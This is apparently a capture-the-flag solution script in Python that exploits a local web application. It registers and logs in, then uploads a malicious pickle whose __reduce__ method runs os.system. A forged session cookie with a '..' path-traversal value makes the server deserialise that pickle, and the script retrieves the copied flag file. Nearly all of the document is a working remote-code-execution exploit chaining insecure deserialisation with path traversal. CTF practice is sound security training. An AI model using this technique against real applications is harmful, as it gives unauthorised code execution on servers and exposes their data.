# solution

```python
import requests, pickle, io, os, random, string

BASE_URL = 'http://localhost:5000'

USERNAME = 'lol'
PASSWORD = 'pass'

session = requests.Session()
session.proxies = {'http':'http://localhost:8080/'}

flag_name = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

class RCE:
    def __reduce__(self):
        cmd = (f'cp /f* /app/src/data/{flag_name}')
        return os.system, (cmd,)

def register():
    data = {
        'username': USERNAME,
        'password': PASSWORD
    }
    response = session.post(f'{BASE_URL}/register', data=data)
    if 'successfully' in response.text.lower():
        print('[+] Registration successful.')
    elif 'already exists' in response.text.lower():
        print('[*] User already registered.')
    else:
        print('[!] Registration failed.')
        print(response.text)

def login():
    data = {
        'username': USERNAME,
        'password': PASSWORD
    }
    response = session.post(f'{BASE_URL}/login', data=data)
    if response.status_code == 200 and 'Logout' in response.text:
        print('[+] Login successful.')
    else:
        print('[!] Login failed.')
        print(response.text)

def upload_file():
    buffer = io.BytesIO()
    pickle.dump(RCE(), buffer)
    buffer.seek(0)

    files = {
        'upload': ('..lol.cache', buffer, 'application/octet-stream')
    }
    response = session.post(f'{BASE_URL}/upload', files=files)
    if response.status_code == 200 or response.status_code == 302:
        print('[+] File uploaded successfully.')
    else:
        print('[!] Upload failed.')
        print(response.text)

def logout():
    session.cookies.set('beaker.session.id', '..lol-lol')
    session.post(f'{BASE_URL}/logout')


def win():
    r = session.get(f'{BASE_URL}/files/{flag_name}')
    print(r.text)

if __name__ == '__main__':
    register()
    login()
    upload_file()
    logout()
    win()
```